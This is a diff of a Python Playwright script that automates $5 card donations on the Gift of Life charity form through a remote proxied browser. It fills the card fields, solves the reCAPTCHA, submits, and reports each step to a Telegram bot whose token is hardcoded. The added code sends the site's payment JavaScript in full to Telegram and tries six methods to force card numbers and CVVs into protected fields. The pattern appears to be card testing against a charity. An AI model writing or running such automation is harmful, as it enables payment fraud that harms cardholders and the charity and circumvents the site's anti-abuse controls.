@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Gift of Life Donation v13 Final — $5 exact, no fee, permanent card fields
+Gift of Life Donation v14 — extract JS + debug card fields
 """
 
 import os
@@ -9,6 +9,7 @@ import time
 import json
 import requests
 import traceback
+import re
 
 try:
     from playwright.sync_api import sync_playwright
@@ -17,7 +18,6 @@ except ImportError:
     os.system("playwright install chromium")
     from playwright.sync_api import sync_playwright
 
-# ═══════════════════════════════════════════════════
 BOT_TOKEN = "8647240736:AAEGXuwmtZkUvAfbURX2BcyyuoWD-TekP_0"
 CHAT_ID = 6843321125
 
@@ -78,6 +78,13 @@ def tg_photo(path, caption=""):
         print(f"TG photo error: {e}", flush=True)
 
 
+def tg_long(label, text, chunk=3500):
+    tg_msg(f"{label} (len={len(text)})")
+    for i in range(0, len(text), chunk):
+        tg_msg(f"<pre>{text[i:i+chunk]}</pre>")
+        time.sleep(0.3)
+
+
 def find_donation_frame(page, total_seconds=120):
     start = time.time()
     attempt = 0
@@ -102,6 +109,36 @@ def check_reject_in_text(text):
     return None
 
 
+# ═══════════════════════════════════════════════════
+#  EXTRACT JS FILES
+# ═══════════════════════════════════════════════════
+
+def fetch_js_files(frame, js_urls, page):
+    """ينزّل كل JS files ويبعت محتواها"""
+    tg_msg(f"🔄 Fetching {len(js_urls)} JS files...")
+    
+    for i, url in enumerate(js_urls):
+        try:
+            tg_msg(f"📥 [{i+1}/{len(js_urls)}] {url[-80:]}")
+            resp = page.request.get(url, timeout=30000)
+            if resp.status == 200:
+                js_content = resp.text()
+                # ابعت بس الملفات اللي فيها card/payment/cvv
+                keywords = ["cardNumber", "cardCSV", "cvv", "payment", "token", "encrypt", "cc-number"]
+                if any(k.lower() in js_content.lower() for k in keywords):
+                    tg_long(f"📄 JS [{i+1}] {url.split('/')[-1]}", js_content)
+                else:
+                    tg_msg(f"⏭️ Skipped (no keywords): {url.split('/')[-1]}")
+            else:
+                tg_msg(f"⚠️ [{i+1}] Status {resp.status}")
+        except Exception as e:
+            tg_msg(f"❌ [{i+1}] {str(e)[:100]}")
+
+
+# ═══════════════════════════════════════════════════
+#  FILL FUNCTIONS
+# ═══════════════════════════════════════════════════
+
 def fill_text_field(frame, field_suffix, value, label=""):
     try:
         el = frame.locator(sid(field_suffix)).first
@@ -120,20 +157,17 @@ def fill_text_field(frame, field_suffix, value, label=""):
 
 
 def remove_processing_fee(frame):
-    """يشيل رسوم المعالجة"""
     try:
         result = frame.evaluate(
             f"""() => {{
                 const P = '{P}';
                 const cb = document.getElementById(P + 'includeFee_input');
                 if (!cb) return {{found: false}};
-                
                 if (cb.checked) cb.click();
                 if (cb.checked) {{
                     cb.checked = false;
                     cb.dispatchEvent(new Event('change', {{bubbles: true}}));
                 }}
-                
                 return {{found: true, checked: cb.checked}};
             }}"""
         )
@@ -145,10 +179,8 @@ def remove_processing_fee(frame):
 
 
 def set_amount_exact(frame, amount):
-    """يحط المبلغ بالظبط بدون رسوم"""
     tg_msg(f"🔄 Setting exact amount = ${amount}")
-
-    # 1. Other radio
+    
     try:
         frame.evaluate(
             f"""() => {{
@@ -162,10 +194,9 @@ def set_amount_exact(frame, amount):
         tg_msg("✅ Other radio checked")
     except Exception as e:
         tg_msg(f"⚠️ Other: {str(e)[:120]}")
-
+    
     time.sleep(3)
-
-    # 2. other_amount
+    
     try:
         frame.evaluate(
             """(amt) => {
@@ -181,14 +212,11 @@ def set_amount_exact(frame, amount):
         tg_msg(f"✅ other_amount = {amount}")
     except Exception as e:
         tg_msg(f"❌ other_amount: {str(e)[:120]}")
-
+    
     time.sleep(3)
-
-    # 3. شيل الرسوم
     remove_processing_fee(frame)
     time.sleep(2)
-
-    # 4. حدّث الحقول
+    
     total = float(amount)
     try:
         frame.evaluate(
@@ -212,17 +240,15 @@ def set_amount_exact(frame, amount):
         tg_msg(f"✅ hidden fields updated: ${total:.2f}")
     except Exception as e:
         tg_msg(f"❌ hidden: {str(e)[:150]}")
-
+    
     time.sleep(2)
-
-    # 5. تحقق
+    
     try:
         check = frame.evaluate(
             f"""() => {{
                 const P = '{P}';
                 return {{
                     other: document.querySelector('input[id*="other_amount"]')?.value,
-                    other_on: document.getElementById(P + 'other_amount_on')?.value,
                     total_label: document.getElementById('label_total_amount')?.value,
                     amount_to_pay: document.getElementById(P + 'amount_to_pay')?.value,
                     payment_amount: document.getElementById(P + 'label_payment_amount')?.value,
@@ -236,59 +262,155 @@ def set_amount_exact(frame, amount):
         pass
 
 
-def fill_card_permanent(frame, field_suffix, value, label=""):
+def debug_card_field(frame, field_suffix, value, label=""):
     """
-    يحول type=password لـ text ويسيبه text (permanent)
-    + fill + keyboard fallback
+    يحاول 6 طرق لملء الحقل + يطبع سلوك الفورم
     """
-    tg_msg(f"🔄 Card fill (text permanent): {label or field_suffix}")
-
+    tg_msg(f"🔍 DEBUG {label} ({field_suffix})")
+    
+    field_id = f"{P}{field_suffix}"
+    
+    # 0. اطبع معلومات الحقل الأولية
     try:
-        # 1. غيّر type لـ text
-        frame.evaluate(
+        initial = frame.evaluate(
             """(id) => {
                 const el = document.getElementById(id);
-                if (!el) return false;
-                el.type = 'text';
-                el.removeAttribute('maxlength');
-                return true;
+                if (!el) return {found: false};
+                return {
+                    found: true,
+                    type: el.type,
+                    maxlength: el.maxLength,
+                    name: el.name,
+                    id: el.id,
+                    readOnly: el.readOnly,
+                    disabled: el.disabled,
+                    value: el.value,
+                    oninput: !!el.oninput,
+                    onchange: !!el.onchange,
+                    onblur: !!el.onblur,
+                    onkeyup: !!el.onkeyup,
+                    onkeydown: !!el.onkeydown,
+                    onpaste: !!el.onpaste,
+                    classes: el.className,
+                    parentHTML: el.parentElement ? el.parentElement.outerHTML.slice(0, 300) : '',
+                };
             }""",
-            f"{P}{field_suffix}"
+            field_id
         )
-        tg_msg(f"✅ {label}: type=text")
-
-        # 2. fill
-        el = frame.locator(sid(field_suffix)).first
-        el.wait_for(state="visible", timeout=10000)
-        el.fill(str(value), timeout=5000)
-        el.evaluate("el => el.dispatchEvent(new Event('input',{bubbles:true}))")
-
-        # 3. تحقق
-        actual = frame.evaluate(
-            "(id) => { const el = document.getElementById(id); return el ? el.value : null; }",
-            f"{P}{field_suffix}"
-        )
-        tg_msg(f"{'✅' if actual == str(value) else '⚠️'} {label}: '{actual}' (len={len(actual) if actual else 0})")
-
-        # 4. keyboard fallback
-        if actual != str(value):
-            tg_msg(f"🔄 {label}: keyboard fallback...")
-            try:
-                el.click(timeout=3000)
-                el.fill("", timeout=2000)
-                frame.page.keyboard.type(str(value), delay=50)
-                actual = frame.evaluate(
-                    "(id) => { const el = document.getElementById(id); return el ? el.value : null; }",
-                    f"{P}{field_suffix}"
-                )
-                tg_msg(f"{'✅' if actual == str(value) else '⚠️'} {label} (keyboard): '{actual}' (len={len(actual) if actual else 0})")
-            except Exception as e:
-                tg_msg(f"⚠️ keyboard: {str(e)[:120]}")
-
-        return actual == str(value)
+        tg_msg(f"📋 {label} initial: {json.dumps(initial, ensure_ascii=False)[:1500]}")
     except Exception as e:
-        tg_msg(f"❌ {label}: {str(e)[:150]}")
-        return False
+        tg_msg(f"⚠️ initial: {str(e)[:150]}")
+    
+    # 1. غير type لـ text + املأ
+    methods = []
+    
+    # Method 1: type=text + fill
+    try:
+        frame.evaluate("""(id) => {
+            const el = document.getElementById(id);
+            if (el) { el.type = 'text'; el.removeAttribute('maxlength'); }
+        }""", field_id)
+        el = frame.locator(f'[id="{field_id}"]').first
+        el.fill(str(value), timeout=5000)
+        actual = frame.evaluate("(id) => document.getElementById(id)?.value", field_id)
+        methods.append(("M1 type=text+fill", actual))
+        tg_msg(f"M1: '{actual}'")
+    except Exception as e:
+        methods.append(("M1", f"ERR:{str(e)[:80]}"))
+        tg_msg(f"M1 ERR: {str(e)[:120]}")
+    
+    # 2. keyboard type
+    try:
+        el = frame.locator(f'[id="{field_id}"]').first
+        el.click(timeout=3000)
+        el.fill("", timeout=2000)
+        frame.page.keyboard.type(str(value), delay=50)
+        actual = frame.evaluate("(id) => document.getElementById(id)?.value", field_id)
+        methods.append(("M2 keyboard", actual))
+        tg_msg(f"M2: '{actual}'")
+    except Exception as e:
+        methods.append(("M2", f"ERR:{str(e)[:80]}"))
+        tg_msg(f"M2 ERR: {str(e)[:120]}")
+    
+    # 3. JS value + input + change + keyup + paste
+    try:
+        frame.evaluate("""([id, val]) => {
+            const el = document.getElementById(id);
+            if (!el) return;
+            el.focus();
+            el.value = val;
+            ['input','change','keyup','keydown','paste','beforeinput'].forEach(evt => {
+                try { el.dispatchEvent(new Event(evt, {bubbles: true})); } catch(e){}
+            });
+        }""", [field_id, str(value)])
+        actual = frame.evaluate("(id) => document.getElementById(id)?.value", field_id)
+        methods.append(("M3 JS+events", actual))
+        tg_msg(f"M3: '{actual}'")
+    except Exception as e:
+        methods.append(("M3", f"ERR:{str(e)[:80]}"))
+        tg_msg(f"M3 ERR: {str(e)[:120]}")
+    
+    # 4. JS only (no events) - ونطبع لو الفورم مسح القيمة
+    try:
+        frame.evaluate("""([id, val]) => {
+            const el = document.getElementById(id);
+            if (!el) return;
+            el.value = val;
+        }""", [field_id, str(value)])
+        actual = frame.evaluate("(id) => document.getElementById(id)?.value", field_id)
+        methods.append(("M4 JS only", actual))
+        tg_msg(f"M4: '{actual}'")
+        
+        # استنى 2 ثانية وشوف لو الفورم مسحها
+        time.sleep(2)
+        actual2 = frame.evaluate("(id) => document.getElementById(id)?.value", field_id)
+        methods.append(("M4-after 2s", actual2))
+        tg_msg(f"M4 after 2s: '{actual2}'")
+    except Exception as e:
+        methods.append(("M4", f"ERR:{str(e)[:80]}"))
+        tg_msg(f"M4 ERR: {str(e)[:120]}")
+    
+    # 5. execCommand insertText (يحاكي الكيبورد)
+    try:
+        el = frame.locator(f'[id="{field_id}"]').first
+        el.click(timeout=3000)
+        el.fill("", timeout=2000)
+        frame.evaluate("""([id, val]) => {
+            const el = document.getElementById(id);
+            if (!el) return;
+            el.focus();
+            document.execCommand('insertText', false, val);
+        }""", [field_id, str(value)])
+        actual = frame.evaluate("(id) => document.getElementById(id)?.value", field_id)
+        methods.append(("M5 execCommand", actual))
+        tg_msg(f"M5: '{actual}'")
+    except Exception as e:
+        methods.append(("M5", f"ERR:{str(e)[:80]}"))
+        tg_msg(f"M5 ERR: {str(e)[:120]}")
+    
+    # 6. type=text + keyboard.type
+    try:
+        frame.evaluate("""(id) => {
+            const el = document.getElementById(id);
+            if (el) el.type = 'text';
+        }""", field_id)
+        el = frame.locator(f'[id="{field_id}"]').first
+        el.click(timeout=3000)
+        el.fill("", timeout=2000)
+        frame.page.keyboard.type(str(value), delay=30)
+        actual = frame.evaluate("(id) => document.getElementById(id)?.value", field_id)
+        methods.append(("M6 type+keyboard", actual))
+        tg_msg(f"M6: '{actual}'")
+    except Exception as e:
+        methods.append(("M6", f"ERR:{str(e)[:80]}"))
+        tg_msg(f"M6 ERR: {str(e)[:120]}")
+    
+    # اطبع النتيجة النهائية
+    tg_msg(f"📊 {label} results:\n" + "\n".join(f"  {m[0]}: '{m[1]}'" for m in methods))
+    
+    # تحقق نهائي
+    final_value = frame.evaluate("(id) => document.getElementById(id)?.value", field_id)
+    return final_value
 
 
 def select_option_safe(frame, field_suffix, value, label=""):
@@ -355,7 +477,7 @@ def solve_captcha_once(frame, page):
 
 
 def run():
-    tg_msg("🚀 Gift of Life Donation v13 Final — $5 exact, no fee")
+    tg_msg("🚀 Gift of Life Donation v14 — Extract JS + Debug Card")
 
     cdp_url = f"wss://{BD_USER}:{BD_PASS}@{BD_HOST}:{BD_PORT}"
 
@@ -400,12 +522,25 @@ def run():
     tg_msg(f"✅ frame='{frame.name}'")
     time.sleep(5)
 
-    # 3. المبلغ = 5، بدون رسوم
-    tg_msg("🔄 [3] Setting exact amount ($5, no fee)...")
+    # 3. استخرج JS files
+    tg_msg("🔄 [3] Extracting JS files...")
+    try:
+        js_urls = frame.evaluate("""() => {
+            return Array.from(document.querySelectorAll('script[src]'))
+                .map(s => s.src)
+                .filter(u => u.includes('Arreva') || u.includes('donation') || u.includes('payment') || u.includes('deluxe'));
+        }""")
+        tg_msg(f"🔎 Found {len(js_urls)} JS files")
+        fetch_js_files(frame, js_urls, page)
+    except Exception as e:
+        tg_msg(f"⚠️ JS extract: {str(e)[:150]}")
+
+    # 4. المبلغ
+    tg_msg("🔄 [4] Setting amount...")
     set_amount_exact(frame, DONATION_AMOUNT)
 
-    # 4. بيانات المتبرع
-    tg_msg("🔄 [4] Donor info...")
+    # 5. بيانات المتبرع
+    tg_msg("🔄 [5] Donor info...")
     fill_text_field(frame, "datafirst", FIRST_NAME, "First name")
     fill_text_field(frame, "datalast", LAST_NAME, "Last name")
     fill_text_field(frame, "email", EMAIL, "Email")
@@ -432,60 +567,41 @@ def run():
 
     select_option_safe(frame, "data_Rstate", STATE_VALUE, "State (CA)")
 
-    # 5. البطاقة
-    tg_msg("🔄 [5] Card info...")
-    time.sleep(1)
+    # 6. DEBUG بطاقة - 6 طرق
+    tg_msg("🔄 [6] DEBUG card fields...")
     fill_text_field(frame, "nameOnCard", CARD_NAME, "Card name")
-    fill_card_permanent(frame, "cardNumber", CARD_NUMBER, "Card number")
-    fill_card_permanent(frame, "cardCSV", CARD_CVV, "CVV")
+    
+    # debug card number
+    debug_card_field(frame, "cardNumber", CARD_NUMBER, "Card number")
+    debug_card_field(frame, "cardCSV", CARD_CVV, "CVV")
+    
     select_option_safe(frame, "cardType", CARD_TYPE, "Card type")
     select_option_safe(frame, "expiration_date_month", CARD_MONTH, "Exp month")
     select_option_safe(frame, "expiration_date_year", CARD_YEAR, "Exp year")
 
+    # 7. screenshot
     try:
         page.screenshot(path="/tmp/before_captcha.png", full_page=True)
         tg_photo("/tmp/before_captcha.png", "📸 Before captcha")
     except Exception:
         pass
 
-    # 7. captcha
+    # 8. reCAPTCHA
     captcha_ok = solve_captcha_once(frame, page)
 
-    # 8. Pre-submit
-    tg_msg("🔄 [8] Verifying...")
+    # 9. Pre-submit
+    tg_msg("🔄 [9] Verifying...")
     try:
         vals = frame.evaluate(f"""() => {{
             const g = (n) => {{
                 const el = document.getElementById('{P}' + n);
                 return el ? el.value : null;
             }};
-            const oa = document.querySelector('input[id*="other_amount"]');
-            const lt = document.getElementById('label_total_amount');
-            const atp = document.getElementById('{P}amount_to_pay');
-            const lp = document.getElementById('{P}label_payment_amount');
-            const cb = document.getElementById('{P}includeFee_input');
             return {{
-                first: g('datafirst'),
-                last: g('datalast'),
-                email: g('email'),
-                phone: g('data_phone'),
-                addr1: g('data_address_one'),
-                addr2: g('data_address_two'),
-                city: g('data_address_city'),
-                zip: g('data_address_zip'),
-                state: g('data_Rstate'),
-                country: g('data_Rcountry'),
-                card_name: g('nameOnCard'),
                 card_num_len: (g('cardNumber') || '').length,
                 cvv_len: (g('cardCSV') || '').length,
-                exp_month: g('expiration_date_month'),
-                exp_year: g('expiration_date_year'),
-                card_type: g('cardType'),
-                other_amount: oa ? oa.value : null,
-                total_label: lt ? lt.value : null,
-                amount_to_pay: atp ? atp.value : null,
-                payment_amount: lp ? lp.value : null,
-                includeFee: cb ? cb.checked : null,
+                amount_to_pay: g('amount_to_pay'),
+                includeFee: document.getElementById('{P}includeFee_input')?.checked,
                 recaptcha_len: (g('g-recaptcha-response') || '').length,
             }};
         }}""")
@@ -493,11 +609,8 @@ def run():
     except Exception as e:
         tg_msg(f"⚠️ Verify: {str(e)[:150]}")
 
-    if not captcha_ok:
-        tg_msg("⛔ captcha not solved")
-
-    # 9. Submit
-    tg_msg("🔄 [9] Clicking Submit...")
+    # 10. Submit
+    tg_msg("🔄 [10] Clicking Submit...")
     try:
         btn = frame.locator(sid("j_idt1913")).first
         btn.wait_for(state="visible", timeout=10000)
@@ -505,19 +618,11 @@ def run():
         tg_msg("✅ Submit clicked")
     except Exception as e:
         tg_msg(f"⚠️ Submit: {str(e)[:150]}")
-        try:
-            frame.evaluate(f"""() => {{
-                const btn = document.getElementById('{P}j_idt1913');
-                if (btn) btn.click();
-            }}""")
-            tg_msg("✅ JS click")
-        except Exception:
-            pass
 
     time.sleep(10)
 
-    # 10. النتيجة
-    tg_msg("🔄 [10] Reading result...")
+    # 11. النتيجة
+    tg_msg("🔄 [11] Reading result...")
     time.sleep(10)
 
     try:
@@ -525,26 +630,6 @@ def run():
         tg_photo("/tmp/result.png", "📸 Result")
     except Exception:
         pass
-
-    final_result = None
-    try:
-        iframe_text = frame.evaluate("() => document.body.innerText")
-        r = check_reject_in_text(iframe_text)
-        if r:
-            final_result = r
-            tg_msg(f"⛔ SERVER REJECT: {r}")
-    except Exception:
-        pass
-
-    if not final_result:
-        try:
-            main_text = page.evaluate("document.body.innerText")
-            r = check_reject_in_text(main_text)
-            if r:
-                final_result = r
-                tg_msg(f"⛔ SERVER REJECT (main): {r}")
-        except Exception:
-            pass
 
     try:
         iframe_text = frame.evaluate("() => document.body.innerText")
@@ -557,15 +642,8 @@ def run():
                 lines.append(l)
         if lines:
             tg_msg("📊 Result:\n" + "\n".join(lines[:25]))
-        else:
-            tg_msg("⚠️ no keywords. preview:\n<pre>" + iframe_text[:1500] + "</pre>")
     except Exception as e:
         tg_msg(f"⚠️ read: {str(e)[:150]}")
-
-    if final_result:
-        tg_msg(f"🏁 FINAL RESULT: {final_result}")
-    else:
-        tg_msg("🏁 FINAL RESULT: unknown")
 
     tg_msg("✅ DONE")
 
